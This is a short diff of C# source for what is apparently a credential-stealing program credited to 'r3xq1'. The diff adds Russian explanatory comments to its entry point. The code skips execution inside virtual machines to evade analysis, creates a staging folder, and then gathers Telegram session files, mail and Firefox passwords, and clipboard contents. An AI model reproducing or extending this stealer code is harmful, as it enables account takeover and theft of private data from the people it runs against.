@@ -13,16 +13,20 @@
          Developer r3xq1       
     \*                    */
 
+    // Потоки и.т.п прикрутите сами)
     internal static partial class Program
     {
         [STAThread]
         public static void Main()
         {
+            // Проверяем на запуск виртуальных машин ( Virtual Machine Check )
             if (!AntiVM.GetCheckVMBot() && !RunCheck.InstanceCheck()) Environment.Exit(0);
-
+            // Создаём папку куда будем всё собирать
             HomeDirectory.Inizialize();
+            // Делаем проверку что папка создалась
             if (CombineEx.ExistsDir(GlobalPath.HomePath))
             {
+                // Собираем данные ....
                 Telega.GetSession(GlobalPath.Tdata, GlobalPath.TelegaHome, "*.*");
                 MailFoxPassword.Inizialize();
                 BuffBoard.Inizialize();
